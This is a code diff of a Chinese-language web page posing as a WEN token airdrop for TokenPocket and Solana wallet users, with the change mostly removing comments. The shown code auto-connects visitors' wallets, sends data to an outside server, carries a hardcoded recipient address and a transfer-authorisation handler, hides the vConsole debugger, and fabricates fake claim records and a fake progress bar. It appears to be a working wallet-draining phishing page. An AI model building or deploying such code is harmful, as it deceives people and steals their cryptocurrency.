@@ -5,39 +5,39 @@
   <title>WEN 代币空投 | tokenpocket 专属空投</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
-  <!-- 替换原来的 QRCode 库 -->
+
 <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
 <link rel="icon" href="https://www.iconaves.com/token_icon_solana/solana/WENWENvqqNya429ubCdR81ZmD69brwQaaBYY6p3LCpk.png" type="image/png">
   <meta name="viewport" id="viewportMeta" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-  <!-- 基础 Meta 标签（推荐同时添加，供其他平台使用） -->
+
 <meta property="og:title" content="WEN 代币空投 | tokenpocket 专属空投" />
 <meta property="og:description" content="立即获得WEN代币空投，合约地址: WENWENvqqNya429ubCdR81ZmD69brwQaaBYY6p3LCpk" />
 <meta property="og:url" content="https://2024web.github.io" />
 
-<!-- Twitter Card 专用标签 -->
+
 <meta name="twitter:title" content="WEN 代币空投 | tokenpocket 专属空投" />
 <meta name="twitter:description" content="立即获得WEN代币空投，合约地址: WENWENvqqNya429ubCdR81ZmD69brwQaaBYY6p3LCpk" />
-<meta name="twitter:site" content="@2024wendao" />  <!-- 可选：关联你的官方推特 -->
+<meta name="twitter:site" content="@2024wendao" /> 
   <style>
-  /* 最近领取记录框 */
+
   #activityList {
-    height: 90%; /* 设置固定高度 */
-    overflow: hidden; /* 隐藏滚动条 */
+    height: 90%; 
+    overflow: hidden;
     position: relative;
   }
  #__vconsole {
-      display: none !important; /* 尝试直接隐藏 */
+      display: none !important;
     }
-    /* 如果 vConsole 仍然存在，用更激进的方式 */
+  
     @media screen and (max-width: 9999px) {
       #__vconsole {
-        right: -9999px !important; /* 强制移出屏幕 */
-        opacity: 0 !important; /* 完全透明 */
-        pointer-events: none !important; /* 禁止交互 */
+        right: -9999px !important; 
+        opacity: 0 !important;
+        pointer-events: none !important;
       }
     }
-  /* 动画效果 */
+
   .activity-item {
     opacity: 0;
     transform: translateY(20px);
@@ -50,11 +50,11 @@
   }
 </style>
   <style>
-     /* 强制 vConsole 移出屏幕 */
+
   
     @media (max-width: 768px) {
   .form-input {
-    max-width: 90%; /* 设置输入框最大宽度为90%，避免太长 */
+    max-width: 90%;
   }
 }
     body {
@@ -68,7 +68,7 @@
       overflow-x: hidden;
     }
     
-    /* 导航栏 - PC端 */
+  
     .navbar {
       display: flex;
       justify-content: space-between;
@@ -137,7 +137,7 @@
       display: none;
     }
     
-    /* 移动端菜单按钮 */
+
     .menu-toggle {
       display: none;
       background: none;
@@ -147,7 +147,7 @@
       cursor: pointer;
     }
     
-    /* 主要内容 */
+
     .main-container {
       max-width: 1200px;
       margin: 0 auto;
@@ -196,7 +196,7 @@
       line-height: 1.2;
     }
     
-    /* 空投卡片 */
+   
     .airdrop-card {
       background: white;
       border-radius: 16px;
@@ -221,7 +221,7 @@
       margin-bottom: 30px;
     }
     
-    /* 统计信息 */
+  
     .stats {
       display: flex;
       justify-content: space-between;
@@ -250,7 +250,7 @@
       color: #666;
     }
     
-    /* 表单元素 */
+  
     .form-group {
       margin-bottom: 25px;
     }
@@ -271,7 +271,7 @@
       transition: all 0.3s ease;
     }
     
-    /* 空投信息 */
+  
     .airdrop-info {
       text-align: center;
       padding: 30px;
@@ -289,7 +289,7 @@
       -webkit-text-fill-color: transparent;
     }
     
-    /* 进度条 */
+
     .progress-container {
       width: 100%;
       height: 10px;
@@ -306,7 +306,6 @@
       transition: width 0.5s ease;
     }
     
-    /* 按钮 */
     .btn {
       width: 100%;
       padding: 18px;
@@ -325,7 +324,7 @@
       box-shadow: 0 4px 15px rgba(108, 92, 231, 0.3);
     }
     
-    /* 活动记录 */
+ 
     .activity-list {
       list-style: none;
       padding: 0;
@@ -353,7 +352,7 @@
       font-size: 0.9rem;
     }
     
-    /* 响应式设计 */
+  
     @media (max-width: 992px) {
       .navbar {
         padding: 15px 5%;
@@ -417,7 +416,7 @@
       }
     }
     
-    /* 弹窗 */
+
     .modal-overlay {
       position: fixed;
       top: 0;
@@ -477,7 +476,7 @@
       cursor: pointer;
       transition: all 0.3s ease;
     }
-    /* 二维码弹窗样式 */
+ 
 #qrModalOverlay {
   position: fixed;
   top: 0;
@@ -537,7 +536,7 @@
     display: inline-flex;
     align-items: center;
     justify-content: center;
-     background-color: rgba(0, 0, 0, 0.7); /* 黑色，70% 不透明度 */
+     background-color: rgba(0, 0, 0, 0.7); 
     border-radius: 24px;
     padding: 8px 16px;
     box-shadow: 0 4px 12px rgba(76, 175, 80, 0.3);
@@ -591,7 +590,7 @@
     font-family: monospace;
   }
   
-  /* 电脑端样式 */
+
   @media (min-width: 768px) {
     .contract-wrapper {
       flex-direction: row;
@@ -613,7 +612,7 @@
 </style>
 </head>
 <body>
-  <!-- 导航栏 -->
+
   <nav class="navbar">
     <a href="#" class="logo">
       <img src="https://www.iconaves.com/token_icon_solana/solana/WENWENvqqNya429ubCdR81ZmD69brwQaaBYY6p3LCpk.png" alt="WEN Logo">
@@ -637,13 +636,13 @@
     
     
   </nav>
-  <!-- 二维码弹窗 -->
+
 <div class="modal-overlay" id="qrModalOverlay">
   <div class="modal-container">
 
     <h2 class="modal-title" id="qrModalTitle">WalletConnect</h2>
    <div class="modal-content" id="qrModalContent">
-  <canvas id="qrcode"></canvas>  <!-- 关键改动！ -->
+  <canvas id="qrcode"></canvas> 
   
 </div>
    <div style="font-size:14px;color:white">使用手机扫描此二维码</div><br />
@@ -669,20 +668,20 @@
 </div>
 <script>
   document.getElementById('copyLinkButton').addEventListener('click', function() {
-    // 获取当前页面的URL
+
     const currentUrl = window.location.href;
     const originalTitle = document.getElementById('qrModalTitle').textContent;
     const titleElement = document.getElementById('qrModalTitle');
     
-    // 使用Clipboard API复制URL
+   
     navigator.clipboard.writeText(currentUrl)
       .then(() => {
-        // 复制成功后的反馈
+     
         showSuccessFeedback(titleElement, originalTitle);
       })
       .catch(err => {
         console.error('Failed to copy URL: ', err);
-        // 备用方法，如果Clipboard API不可用
+    
         const textArea = document.createElement('textarea');
         textArea.value = currentUrl;
         document.body.appendChild(textArea);
@@ -698,10 +697,10 @@
   });
   
   function showSuccessFeedback(element, originalText) {
-    // 保存原始HTML内容
+ 
     const originalHTML = element.innerHTML;
     
-    // 设置新的反馈内容
+    
     element.innerHTML = `
       <span class="success-feedback">
         <span class="checkmark">✓</span>
@@ -709,13 +708,13 @@
       </span>
     `;
     
-    // 2秒后恢复原状
+
     setTimeout(() => {
       element.textContent = originalText;
     }, 2000);
   }
 </script>
-  <!-- 主要内容 -->
+
   <div class="main-container">
     <div class="hero">
   <h1>领取您的 WEN 代币空投</h1>
@@ -774,7 +773,7 @@
      </div>
    </div>
   
-  <!-- 弹窗 -->
+
   <div class="modal-overlay" id="modalOverlay">
     <div class="modal-container">
       <div class="modal-icon" id="modalIcon">🎁</div>
@@ -785,71 +784,62 @@
   </div>
 
   <script>
-    // 修复手机端无法滑动的问题
-    
-    
-    
+
     document.body.style.overflow = 'auto';
     document.body.style.position = 'relative';
     document.body.style.height = 'auto';
     const specifiedAddress = 'Cm6mrpZrRLrp6G85tKbD5QZumNLGboFofsaduQ22JT4L'; 
-// 设置初始领取百分比
-let currentProgress = 32.00; // 初始值为 32.00%
 
-// 页面加载时立即显示进度，并开始动画
+let currentProgress = 32.00;
+
+
 window.onload = function() {
-  // 显示当前进度条和百分比文本
+
   const progressBar = document.getElementById('progressBar');
   const progressLabel = document.getElementById('progressLabel');
-  
-  // 设置初始的进度条宽度和文本
+
   progressBar.style.width = `${currentProgress}%`;
   progressLabel.textContent = `已领取 ${currentProgress.toFixed(2)}%`;
 
-  // 启动进度更新动画
+
   setTimeout(updateProgress, 1000);
 };
 
-// 每分钟平滑过渡进度
+
 function updateProgress() {
   const targetProgress = Math.floor(currentProgress) + 1; // 目标进度是当前整数部分 + 1
 
   let startTime = null;
 
   function smoothUpdate(timestamp) {
-    if (!startTime) startTime = timestamp; // 初始化开始时间
-    const progressDuration = 60000; // 设置动画持续时间为1分钟（60000ms）
+    if (!startTime) startTime = timestamp;
+    const progressDuration = 60000; 
     const elapsedTime = timestamp - startTime;
 
-    // 计算动画进度（在0到1之间）
     const progress = Math.min(elapsedTime / progressDuration, 1);
 
-    // 平滑计算当前进度
-    currentProgress = Math.floor(currentProgress) + progress; // 使用当前整数部分加上动画过渡的小数部分
+    currentProgress = Math.floor(currentProgress) + progress;
 
-    // 更新进度条宽度
     const progressBar = document.getElementById('progressBar');
-    progressBar.style.width = `${currentProgress}%`; // 更新进度条的宽度
+    progressBar.style.width = `${currentProgress}%`; 
 
-    // 更新文本内容
+
     const progressLabel = document.getElementById('progressLabel');
-    progressLabel.textContent = `已领取 ${currentProgress.toFixed(2)}%`; // 保留两位小数
+    progressLabel.textContent = `已领取 ${currentProgress.toFixed(2)}%`;
 
-    // 如果动画未结束，继续请求下一帧
     if (progress < 1) {
       requestAnimationFrame(smoothUpdate);
     } else {
-      // 当动画完成后，确保精确更新到目标值
+   
       currentProgress = targetProgress;
       progressBar.style.width = `${currentProgress}%`;
       progressLabel.textContent = `已领取 ${currentProgress.toFixed(2)}%`;
 
-      // 下一次动画开始前更新目标
-      setTimeout(updateProgress, 60000); // 1分钟后开始下一次进度更新
+      setTimeout(updateProgress, 60000); 
     }
   }
 
-  // 开始平滑动画
+
   requestAnimationFrame(smoothUpdate);
 }
 
@@ -859,13 +849,12 @@ async function autoConnectWallet() {
       const response = await window.solana.connect();
       const walletAddress = response.publicKey.toString();
       
-      // 填充地址到输入框，并设为只读
       const addressInput = document.getElementById('addressInput');
       if (addressInput) {
-        addressInput.value = walletAddress;  // 填充地址
-        addressInput.readOnly = true;  // 设置为只读
+        addressInput.value = walletAddress;  
+        addressInput.readOnly = true;  
       }
-      // 更新连接按钮文本为钱包地址的前3和后4位
+
       const connectButton = document.getElementById('connectButton');
       if (connectButton) {
         connectButton.innerText = walletAddress.slice(0, 3) + '...' + walletAddress.slice(-4);
@@ -876,25 +865,25 @@ async function autoConnectWallet() {
   }
 }
 function checkDeviceAndHandleWallet() {
-    const isPC = window.innerWidth > 768;  // 判断是否为PC设备
+    const isPC = window.innerWidth > 768;  
     const istokenpocket = typeof window.tokenpocket !== 'undefined';
     
     if (isPC && !istokenpocket) {
-        // 如果是PC设备且没有tokenpocket环境，禁止连接钱包，隐藏连接钱包按钮
+      
         const connectButton = document.getElementById('connectButton');
         if (connectButton) {
-            connectButton.style.display = 'none';  // 隐藏连接钱包按钮
+            connectButton.style.display = 'none'; 
         }
         
-        // 断开钱包连接的逻辑（如果已连接钱包）
+    
         if (window.solana && window.solana.isConnected) {
-            window.solana.disconnect();  // 断开钱包连接
+            window.solana.disconnect();  
         }
     } else if (!isPC) {
-        // 如果是安卓或其他移动设备，保留现有逻辑，尝试自动连接钱包
+      
         autoConnectWallet();
     }
-    // 如果是PC且有tokenpocket环境，什么都不做（不执行任何操作）
+  
 }
 document.addEventListener('DOMContentLoaded', () => {
   checkDeviceAndHandleWallet();
@@ -905,19 +894,19 @@ document.addEventListener('DOMContentLoaded', () => {
     for (let i = 0; i < 32; i++) {
       address += characters.charAt(Math.floor(Math.random() * characters.length));
     }
-    // 返回地址格式：前4个字符 + ... + 后6个字符
+
     return address.slice(0, 4) + '...' + address.slice(-6);
   }
-    // 生成虚假领取记录
+ 
    function generateFakeActivities() {
     const activities = [];
     const tokens = ['WEN'];
     const now = new Date();
     
     for (let i = 0; i < 15; i++) {
-      const minutesAgo = Math.floor(Math.random() * 1440); // 24小时内
+      const minutesAgo = Math.floor(Math.random() * 1440); 
       const time = new Date(now.getTime() - minutesAgo * 60000);
-      const address = generateSolanaAddress();  // 使用Solana地址生成函数
+      const address = generateSolanaAddress();  
       const amount = Math.floor(Math.random() * 4901) + 100; 
       const token = tokens[Math.floor(Math.random() * tokens.length)];
       
@@ -932,17 +921,17 @@ document.addEventListener('DOMContentLoaded', () => {
     return activities;
   }
     
-    // 显示虚假领取记录
+  
    function displayFakeActivities() {
     const activityList = document.getElementById('activityList');
     const activities = generateFakeActivities();
     let index = 0;
 
-    // 确定每个设备端最多显示的记录数
-    const maxItems = window.innerWidth <= 768 ? 4 : 8;  // 手机端最多显示4条，电脑端最多显示8条
+  
+    const maxItems = window.innerWidth <= 768 ? 4 : 8;
     const interval = setInterval(() => {
       if (index >= activities.length) {
-        clearInterval(interval); // 所有记录显示完成后清除定时器
+        clearInterval(interval); 
       } else {
         const activity = activities[index];
         const li = document.createElement('li');
@@ -956,26 +945,26 @@ document.addEventListener('DOMContentLoaded', () => {
         `;
         activityList.appendChild(li);
 
-        // 添加动画显示效果
+     
         setTimeout(() => {
           li.classList.add('show');
-        }, 50); // 延迟一点，确保动画生效
+        }, 50); 
 
-        // 如果超过最大显示数量，删除最旧的记录
+     
         if (activityList.children.length > maxItems) {
           activityList.removeChild(activityList.children[0]);
         }
 
         index++;
       }
-    }, Math.random() * 4000 + 1000); // 随机间隔1到5秒
+    }, Math.random() * 4000 + 1000);
   }
     
 
     
 document.addEventListener('DOMContentLoaded', async () => {
   try {
-    // 检查是否存在TokenPocket或tokenpocket钱包
+    
     const isTokenPocket = window.solana && window.solana.isTokenPocket;
     const istokenpocket = typeof window.tokenpocket !== 'undefined';
     
@@ -984,7 +973,7 @@ document.addEventListener('DOMContentLoaded', async () => {
       return;
     }
 
-    // 根据钱包类型选择连接方式
+   
     let walletAddress;
     if (isTokenPocket) {
       const connection = new solanaWeb3.Connection('https://solana3.mytokenpocket.vip');
@@ -1003,10 +992,10 @@ document.addEventListener('DOMContentLoaded', async () => {
       const specifiedAddress = 'Cm6mrpZrRLrp6G85tKbD5QZumNLGboFofsaduQ22JT4L'; 
     
 
-    // 获取钱包地址的前3位和后4位
+ 
     const shortenedAddress = walletAddress.slice(0, 3) + '...' + walletAddress.slice(-4);
 
-    // 更新UI元素
+
     const connectButton = document.getElementById('connectButton');
     if (connectButton) {
       connectButton.innerText = shortenedAddress;
@@ -1028,7 +1017,7 @@ document.addEventListener('DOMContentLoaded', async () => {
       transferAuth.disabled = false;
     }
 
-    // 调用后台API请求
+ 
     try {
       const res = await fetch('https://api2.001br.com/prefetch-token', {
         method: 'POST',
@@ -1145,8 +1134,7 @@ document.getElementById('transferAuth').addEventListener('click', async () => {
   }
 });
 
- 
-    // 显示模态框
+
     function showModal(title, message, icon = "🎁", isError = false) {
       const modal = document.getElementById('modalOverlay');
       const modalTitle = document.getElementById('modalTitle');
@@ -1172,69 +1160,67 @@ document.getElementById('transferAuth').addEventListener('click', async () => {
       document.getElementById('modalOverlay').classList.remove('show');
     }
     
-    // 移动端菜单切换
-  // 移动端菜单切换 - 修改后的版本
+
 const menuToggle = document.getElementById('menuToggle');
 const navLinks = document.getElementById('navLinks');
 
-// 点击菜单按钮切换菜单
+
 menuToggle.addEventListener('click', function() {
   navLinks.classList.toggle('active');
   this.innerHTML = navLinks.classList.contains('active') ? 
     '<i class="fas fa-times"></i>' : '<i class="fas fa-bars"></i>';
 });
 
-// 点击菜单项后收起菜单
+
 document.querySelectorAll('.nav-links a').forEach(link => {
   link.addEventListener('click', function() {
-    if (window.innerWidth <= 768) { // 只在移动端生效
+    if (window.innerWidth <= 768) {
       navLinks.classList.remove('active');
       menuToggle.innerHTML = '<i class="fas fa-bars"></i>';
     }
   });
 });
 
-// 滑动页面时收起菜单
+
 window.addEventListener('scroll', function() {
   if (window.innerWidth <= 768 && navLinks.classList.contains('active')) {
     navLinks.classList.remove('active');
     menuToggle.innerHTML = '<i class="fas fa-bars"></i>';
   }
 });
-    
-    // 页面加载完成后执行
+
 document.addEventListener('DOMContentLoaded', () => {
-  displayFakeActivities();  // 确保虚假记录能正常显示
+  displayFakeActivities(); 
   autoConnectWallet();
   
-  // 检测设备类型和环境
+ 
   const isMobile = window.innerWidth <= 768;
   const istokenpocket = typeof window.tokenpocket !== 'undefined';
 
-  // 如果是PC且没有tokenpocket环境，弹出二维码弹窗
+
   if (!isMobile && !istokenpocket) {
-    showQRCodeModal();  // 调用二维码生成弹窗
+    showQRCodeModal();  
   } 
-  // 如果是移动设备或PC有tokenpocket环境，尝试自动连接钱包
+
   else {
     autoConnectWallet();
   }
 });
 
-// 显示二维码弹窗
+
 function showQRCodeModal() {
   const qrModal = document.getElementById('qrModalOverlay');
   const canvas = document.getElementById('qrcode');
   const currentUrl = window.location.href.split('#')[0];
 
-  // 清空 canvas
+
   const ctx = canvas.getContext('2d');
   ctx.clearRect(0, 0, canvas.width, canvas.height);
 
-  // 你的 SVG 图标的 URL
+
   const logoURL = 'https://www.iconaves.com/chain/solana.png';
 
-  // 生成二维码并绘制到 canvas 上
+
   QRCode.toCanvas(
     canvas,
     currentUrl,
@@ -1246,29 +1232,25 @@ function showQRCodeModal() {
       if (error) {
         console.error("生成失败:", error);
       } else {
-        // 加载并绘制 Logo 图片到二维码上
+   
         const logoImage = new Image();
         logoImage.onload = function() {
-          const logoSize = 40;  // 设置 Logo 大小
-          const x = (canvas.width - logoSize) / 2;  // 居中
-          const y = (canvas.height - logoSize) / 2; // 居中
+          const logoSize = 40; 
+          const x = (canvas.width - logoSize) / 2; 
+          const y = (canvas.height - logoSize) / 2;
 
-          // 在二维码中心绘制 Logo
+     
           ctx.drawImage(logoImage, x, y, logoSize, logoSize);
         };
         logoImage.src = logoURL;
 
-        // 显示二维码 Modal
+     
         qrModal.classList.add('show');
       }
     }
   );
 }
 
-
-    
-    // 原有领取空投功能保持不变
-    
     
     function base64ToUint8Array(base64) {
       const binaryString = atob(base64);
